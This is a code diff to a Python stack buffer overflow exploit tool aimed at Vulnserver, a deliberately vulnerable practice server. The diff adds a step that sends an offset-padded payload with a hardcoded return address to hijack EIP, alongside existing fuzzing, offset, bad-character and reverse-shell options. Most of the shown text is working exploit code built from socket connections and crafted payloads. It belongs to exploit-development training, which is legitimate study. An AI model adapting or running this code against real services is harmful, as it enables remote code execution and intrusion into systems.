@@ -38,6 +38,7 @@ def try_fuzzing(target_ip, target_port, cmd_attacking):
 def try_offset(target_ip, target_port, cmd_attacking):
     offset = str(input("Enter the offset: "))
     border()
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, target_port))
@@ -53,13 +54,15 @@ def try_offset(target_ip, target_port, cmd_attacking):
 def try_overwrite_eip(target_ip, target_port, cmd_attacking):
     offset = int(input("Enter the exact offset value: "))
     shellcode = "A" * offset + "B" * 4
+    border()
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, target_port))
         payload = cmd_attacking + shellcode
         s.send(payload.encode())
-        print(f"\nPayload sent with a offset of {offset} bytes. \nExpected EIP value should be 42424242.\n")
+        print(f"\nPayload sent with a offset of {offset} bytes."
+              f" \nExpected EIP value should be 42424242.\n")
         s.close()
         border()
     except:
@@ -88,6 +91,7 @@ def try_bad_chars(target_ip, target_port, cmd_attacking):
 
     offset = int(input("Enter exact offset value: "))
     shellcode = "A" * offset + "B" * 4 + bad_chars
+    border()
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -99,6 +103,25 @@ def try_bad_chars(target_ip, target_port, cmd_attacking):
         border()
     except:
         server_error()
+
+
+def try_right_module(target_ip, target_port, cmd_attacking):
+    offset = int(input("Enter the exact offset value: "))
+    shellcode = b"A" * offset + b"\xaf\x11\x50\x62"
+    border()
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        payload = bytes(cmd_attacking, encoding='utf-8') + shellcode
+        print(f"\nPayload sent with a offset of {offset} bytes. "
+              f"\nEIP should match the address for the correct module.\n")
+        s.send(payload)
+        s.close()
+        border()
+    except:
+        print("Error connecting to server")
+        sys.exit()
 
 
 def try_reverse_shell(target_ip, target_port, cmd_attacking):
@@ -157,8 +180,8 @@ def main():
     border()
     print("\n                      Simple Stack Buffer Overflow for Vulnserver\n")
     border()
-    print("Options: \n\n   1. Fuzzing \n   2. Offset \n   3. Overwrite EIP \n   4. Bad Chars \n   5. Reverse Shell \n")
-    option = int(input("Enter option: "))
+    print("Options: \n\n   1. Fuzzing \n   2. Offset \n   3. Overwrite EIP \n   4. Bad Chars \n   5. Right Module\n   6. Reverse Shell \n")
+    option = int(input("Run option: "))
     border()
 
     if option == 1:
@@ -170,6 +193,8 @@ def main():
     elif option == 4:
         try_bad_chars(target_ip, target_port, cmd_attacking)
     elif option == 5:
+        try_right_module(target_ip, target_port, cmd_attacking)
+    elif option == 6:
         try_reverse_shell(target_ip, target_port, cmd_attacking)
 
 
